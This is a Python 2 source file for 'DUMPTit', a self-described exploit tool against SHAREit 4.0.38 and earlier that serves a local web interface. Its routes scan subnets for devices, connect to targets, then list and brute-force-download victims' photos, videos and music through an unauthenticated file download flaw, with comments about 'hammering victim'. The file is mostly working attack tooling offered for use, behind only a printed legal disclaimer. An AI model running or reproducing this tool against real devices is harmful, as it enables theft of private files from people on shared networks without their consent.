#!/usr/bin/env python
import sys, os, posixpath, urllib, urlparse, mimetypes, shutil, random, string, json, re
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from SocketServer import ThreadingMixIn
from threading import Thread

from exploit import exploit, helper

    
class RequestHandler(BaseHTTPRequestHandler):
    #Default response
    empty_response = {'headers':{'Content-Type':'text/html; charset=utf-8'},'content':''}
    json_output = {'status':'success','msg':'','data':''}
    
    #Create random session ID
    session_id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(32))
    #Session storage path
    session_storage_path = '/tmp/sessions'
    #session data
    session = {}
    
    #Create ext/mimetype dict
    if not mimetypes.inited:
        mimetypes.init() # try to read system mime.types
    extensions_map = mimetypes.types_map.copy()
    extensions_map.update({
        '': 'application/octet-stream', # Default
        '.py': 'text/plain',
        '.c': 'text/plain',
        '.h': 'text/plain',
        })
        
    
    def do_HEAD(self):
        self.send_response(200)
        self.send_header('Content-Type','text/plain')
        self.end_headers()

    def do_GET(self):
        self.read_session()
        #print 'Current Session ID: %s' % str(self.session_id)
        #Parse URI path
        path_parts = urlparse.urlparse(self.path)
        #Parse Query String
        querystring = urlparse.parse_qs(path_parts.query)
        
        #Identify requested page
        urlpath = path_parts.path
        page = 'index'
        if len(urlpath) > 0 and urlpath[-1] == '/':
            urlpath = urlpath[0:-1]
        if len(urlpath) > 0:
            page = os.path.basename(urlpath).lower()

        #URL ROUTES
        ROUTES = {
            'retrieve_networks':self.retrieve_networks,
            'scan_subnet':self.scan_subnet,
            'check_authorization':self.check_authorization,
            'connect':self.authorize_attempt,
            'show_thumbs':self.show_thumbs,
            'get_media_files': self.get_media_files,
            'brute_files':self.brute_files,
            }

        #Call the proper handler for the page
        if page in ROUTES.keys():
            Controller = ROUTES[page]
        else:
            Controller = self.default
        
        Controller(page,querystring)
        if page in ['get_media_files','brute_files']: #Update session only when needed
            self.update_session()
        
    def read_session(self):
        output = {}
        session_path = self.translate_path(self.session_storage_path + '/' + self.session_id)
        if os.path.isfile(session_path):
            try:
                f = open(session_path)
                output = json.load(f)
                f.close()
                if output is None:
                    output = {}
            except:
                pass
        self.session = output

    def update_session(self):
        session_path = self.translate_path(self.session_storage_path + '/' + self.session_id)
        try:
            f = open(session_path,'w+')

            #We re-read the session file just in case it got updated by another thread while executing current request
            try:
                old_session = json.load(f)
                if old_session is None:
                    old_session = {}
            except Exception as e:
                old_session = {}
            old_session.update(self.session)

            json.dump(old_session, f)
            f.close()
        except Exception as e:
            print('Error saving session',e)
        
        
                

    def translate_path(self, path):
        """Translate a /-separated PATH to the local filename syntax.
        Components that mean special things to the local file system
        (e.g. drive or directory names) are ignored.  (XXX They should
        probably be diagnosed.)
        """
        # abandon query parameters
        path = path.split('?',1)[0]
        path = path.split('#',1)[0]
        path = posixpath.normpath(urllib.unquote(path))
        words = path.split('/')
        words = filter(None, words)
        #Commented since we prefer to make the path relative to exploit directory not current working directory
        #path = os.getcwd() 
        path = os.path.dirname(os.path.realpath(__file__))
        for word in words:
            drive, word = os.path.splitdrive(word)
            head, word = os.path.split(word)
            if word in (os.curdir, os.pardir): continue
            path = os.path.join(path, word)
        return path

    def guess_type(self, path):
        """Guess the type of a file.
        Argument is a PATH (a filename).
        Return value is a string of the form type/subtype,
        usable for a MIME Content-type header.
        The default implementation looks the file's extension
        up in the table self.extensions_map, using application/octet-stream
        as a default; however it would be permissible (if
        slow) to look inside the data to make a better guess.
        """

        base, ext = posixpath.splitext(path)
        if ext in self.extensions_map:
            return self.extensions_map[ext]
        ext = ext.lower()
        if ext in self.extensions_map:
            return self.extensions_map[ext]
        else:
            return self.extensions_map['']

    def display_file(self, fpath):
        if os.path.isfile(fpath) and os:
            f = open(fpath,'rb')
            ctype = self.guess_type(fpath)
            self.send_response(200)
            self.send_header("Content-type", ctype)
            fs = os.fstat(f.fileno())
            self.send_header("Content-Length", str(fs[6]))
            self.send_header("Last-Modified", self.date_time_string(fs.st_mtime))
            self.end_headers()
            shutil.copyfileobj(f, self.wfile)
            f.close()
        else:
            self.send_error(404, "File not found")

            
    def send_ok(self,response):
        self.send_response(200)
        self.send_header('Content-Type',
                         'text/html; charset=utf-8')
        for header, value in response['headers'].iteritems():
            self.send_header(header,value)
        self.end_headers()
        self.wfile.write(response['content'].encode('utf-8'))

    def read_temp(self,file_path,default=''):
        temp_path = self.translate_path(file_path)
        if os.path.isfile(temp_path):
            try:
                with open(temp_path) as f:
                    return f.read()
            except:
                pass
        return default

        
    def retrieve_networks(self,page,qs):
        response = RequestHandler.empty_response.copy()
        json_output = RequestHandler.json_output.copy();
        json_output['data'] = exploit.discover_networks()
        response['headers'] = {'Content-Type':'application/json; charset=utf-8'}
        response['content'] = json.dumps(json_output)
        self.send_ok(response)

    
    def check_authorization(self,page,qs):
        response = RequestHandler.empty_response.copy()
        json_output = RequestHandler.json_output.copy();
        ip = str(qs['ip'][0]) if 'ip' in qs else False
        if ip == False:
            json_output['status'] = 'error'
            json_output['msg'] = 'missing IP'
        elif not re.match(r'^(?:\d{1,3}\.){3}\d{1,3}$',ip):
            json_output['status'] = 'error'
            json_output['msg'] = 'Invalid IP'
        else:
            json_output['data'] = exploit.is_authorized(ip);
        response['headers'] = {'Content-Type':'application/json; charset=utf-8'}
        response['content'] = json.dumps(json_output)
        self.send_ok(response)

    def authorize_attempt(self,page,qs):
        response = RequestHandler.empty_response.copy()
        json_output = RequestHandler.json_output.copy();
        src_ip = str(qs['src_ip'][0]) if 'src_ip' in qs else False
        target_ip = str(qs['target_ip'][0]) if 'target_ip' in qs else False
        if src_ip == False or target_ip == False :
            json_output['status'] = 'error'
            json_output['msg'] = 'missing IP'
        elif not re.match(r'^(?:\d{1,3}\.){3}\d{1,3}$',src_ip) or not re.match(r'^(?:\d{1,3}\.){3}\d{1,3}$',target_ip):
            json_output['status'] = 'error'
            json_output['msg'] = 'Invalid IP'
        else:
            json_output['data'] = exploit.auto_connect(src_ip, target_ip)
        response['headers'] = {'Content-Type':'application/json; charset=utf-8'}
        response['content'] = json.dumps(json_output)
        self.send_ok(response)

    def scan_subnet(self,page,qs):
        response = RequestHandler.empty_response.copy()
        json_output = RequestHandler.json_output.copy();
        ip = str(qs['ip'][0]) if 'ip' in qs else False
        if ip == False:
            json_output['status'] = 'error'
            json_output['msg'] = 'missing IP'
        elif not re.match(r'^(?:\d{1,3}\.){3}\d{1,3}$',ip):
            json_output['status'] = 'error'
            json_output['msg'] = 'Invalid IP'
        else:
            json_output['data'] = exploit.scan_ip_range(ip)
        response['headers'] = {'Content-Type':'application/json; charset=utf-8'}
        response['content'] = json.dumps(json_output)
        self.send_ok(response)

    def show_thumbs(self,page,qs):
        response = RequestHandler.empty_response.copy()
        json_output = RequestHandler.json_output.copy()
        allowed_types = exploit.asset_types
        file_type = str(qs['album'][0]) if 'album' in qs else 'photo' 
        ip = str(qs['ip'][0]) if 'ip' in qs else False
        if ip == False:
            json_output['status'] = 'error'
            json_output['msg'] = 'missing IP'
        elif not re.match(r'^(?:\d{1,3}\.){3}\d{1,3}$',ip):
            json_output['status'] = 'error'
            json_output['msg'] = 'Invalid IP'
        elif file_type not in allowed_types:
            json_output['status'] = 'error'
            json_output['msg'] = 'Unsupported album'
        else:
            data = []
            if file_type in exploit.assets_with_thumbs:
                path = '/tmp/%s/%s/%s/thumbs'%(self.session_id,ip,file_type)
                realpath = self.translate_path(path)
                if os.path.isdir(realpath):
                    for filename in os.listdir(realpath):
                        if filename.endswith(".jpg"):
                            data.append('%s/%s'%(path,filename))
            else:
                path = '/tmp/%s/%s/%s/data'%(self.session_id,ip,file_type)
                realpath = self.translate_path(path)
                if os.path.isdir(realpath):
                    for filename in os.listdir(realpath):
                            data.append('%s/%s'%(path,filename))
            json_output['data'] = data
        response['headers'] = {'Content-Type':'application/json; charset=utf-8'}
        response['content'] = json.dumps(json_output)
        self.send_ok(response)


    def get_media_files(self,page,qs):
        response = RequestHandler.empty_response.copy()
        json_output = RequestHandler.json_output.copy()
        self.session['media_success'] = self.session['media_success'] if 'media_success' in self.session else {}
        #allowed_types = ['photo','video','music']
        file_type = str(qs['album'][0]) if 'album' in qs else 'photo' 
        file_format = 'thumbnail' if file_type in exploit.assets_with_thumbs else 'raw'
        ip = str(qs['ip'][0]) if 'ip' in qs else False
        if ip == False:
            json_output['status'] = 'error'
            json_output['msg'] = 'missing IP'
        elif not re.match(r'^(?:\d{1,3}\.){3}\d{1,3}$',ip):
            json_output['status'] = 'error'
            json_output['msg'] = 'Invalid IP'
            """
            elif file_type not in allowed_types:
                json_output['status'] = 'error'
                json_output['msg'] = 'Unsupported album'
            """
        else:
            data = {"found":0, "downloaded":False}
            identifier = '%s_%s' % (ip,file_type)
            if identifier not in self.session['media_success'].keys():
                path = '/tmp/%s/%s/%s'%(self.session_id,ip,file_type)
                path += '/thumbs' if file_format == 'thumbnail' else '/data'
                realpath = self.translate_path(path)
                try:
                    if not os.path.isdir(realpath):
                        helper.mkdir(realpath)
                except Exception:
                    response['status'] = 'error'
                    response['msg'] = 'Unable to create directory to save files, make sure we have sufficient permissions'
                    realpath = None
                if realpath is not None:
                    data['found'] = exploit.list_media_from_db(ip,file_type)
                    if data['found'] is not None and len(data['found']) > 0:
                        self.session['media_success'][identifier] = data
                        try:
                            if file_format == 'thumbnail':
                                asset_ids = data['found'].keys()
                                requested_file_type = file_type
                            else:
                                asset_ids = [file['path'] for file in data['found'].itervalues()]
                                requested_file_type = 'file'
                            result = exploit.download_multi_assets(ip,realpath,requested_file_type,asset_ids,file_format)
                            if result is not None and len(result) > 0:
                                data['downloaded'] = True
                                #record successful retrieval to avoid hammering victim with dupes
                                self.session['media_success'][identifier] = data
                        except Exception as e:
                            print e
                            pass
                    #else:
                        #If there are no files in mediadb of this type or media db does not exist, just record it as a successful attempt
                        #self.session['media_success'][identifier] = data
                    json_output['data'] = data
            else:
                json_output['data'] = self.session['media_success'][identifier]
        response['headers'] = {'Content-Type':'application/json; charset=utf-8'}
        response['content'] = json.dumps(json_output)
        self.send_ok(response)


    def brute_files(self,page,qs):
        response = RequestHandler.empty_response.copy()
        json_output = RequestHandler.json_output.copy()
        self.session['brute_success'] = self.session['brute_success'] if 'brute_success' in self.session else {}
        allowed_types = ['photo','video','music']
        file_type = str(qs['album'][0]) if 'album' in qs else 'photo' 
        file_format = 'thumbnail' if file_type in exploit.assets_with_thumbs else 'raw'
        ip = str(qs['ip'][0]) if 'ip' in qs else False
        try:
            id_from = int(qs['from'][0]) if 'from' in qs else 1
        except Exception:
            id_from = 1
        try:
            id_to = int(qs['to'][0]) if 'to' in qs else 2000
        except Exception:
            id_to = 2000
        try:
            id_step = int(qs['step'][0]) if 'step' in qs else 20
        except Exception:
            id_step = 20
        
        if ip == False:
            json_output['status'] = 'error'
            json_output['msg'] = 'missing IP'
        elif not re.match(r'^(?:\d{1,3}\.){3}\d{1,3}$',ip):
            json_output['status'] = 'error'
            json_output['msg'] = 'Invalid IP'
        elif file_type not in allowed_types:
            json_output['status'] = 'error'
            json_output['msg'] = 'Unsupported album'
        else:
            data = []
            identifier = '%s_%s_%s_%s_%s' % (ip,file_type,str(id_from),str(id_to),str(id_step))
            if identifier not in self.session['brute_success'].keys():
                path = '/tmp/%s/%s/%s'%(self.session_id,ip,file_type)
                path += '/thumbs' if file_format == 'thumbnail' else '/data'
                realpath = self.translate_path(path)
                try:
                    if not os.path.isdir(realpath):
                        helper.mkdir(realpath)
                except Exception:
                    response['status'] = 'error'
                    response['msg'] = 'Unable to create directory to save files, make sure we have sufficient permissions'
                    realpath = None
                if realpath is not None:
                    data = exploit.brute_assets(ip,realpath,file_type,id_from,id_to,id_step)
                    if len(data) > 0:
                        #record successful retrieval to avoid hammering victim with dupes
                        self.session['brute_success'][identifier] = len(data)
                    json_output['data'] = len(data)
            else:
                json_output['data'] = self.session['brute_success'][identifier]
        response['headers'] = {'Content-Type':'application/json; charset=utf-8'}
        response['content'] = json.dumps(json_output)
        self.send_ok(response)
        
    def default(self, page, qs):
        #Extensions of local files allowed to be viewed/downloaded using web server
        allowed_exts = ['.ico','.jpg','.jpeg','.png','.gif','.svg','.js','.css','.html','.eot','.otf','.woff','.ttf']

        base, ext = posixpath.splitext(self.path.lower())
        real_path = self.translate_path(self.path)
        tmp_path = self.translate_path('/tmp')
        in_temp = False
        if len(real_path) >= len(tmp_path) and real_path[0:len(tmp_path)] == tmp_path:
            session_path = self.translate_path(self.session_storage_path)
            if len(real_path) < len(session_path) or real_path[0:len(session_path)].lower() != session_path.lower():
                in_temp = True

        if ext in allowed_exts or in_temp:
            self.display_file(real_path)
            return
        response = RequestHandler.empty_response.copy()
        response['content'] = self.read_temp('/static/skeleton.html')
        self.send_ok(response)


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Multithreaded HTTP Server"""
    daemon_threads = True


httpd = ThreadedHTTPServer(('',8080),RequestHandler)
try:
    print """
  _____  _    _ __  __ _____ _ _   _ 
 |  __ \| |  | |  \/  |  __ (_) | | |
 | |  | | |  | | \  / | |__) || |_| |
 | |  | | |  | | |\/| |  ___/ | __| |
 | |__| | |__| | |  | | |   | | |_|_|
 |_____/ \____/|_|  |_|_|   |_|\__(_)
    
    """
    print 'DUMPTit - SHAREit <= 4.0.38 Unauthenticated Arbitrary File Download Exploit \n'
    print "legal disclaimer: Usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n"
    print 'Starting webserver at http://0.0.0.0:8080'
    httpd.serve_forever()
except KeyboardInterrupt:
    httpd.shutdown()
    httpd.server_close()
    pass


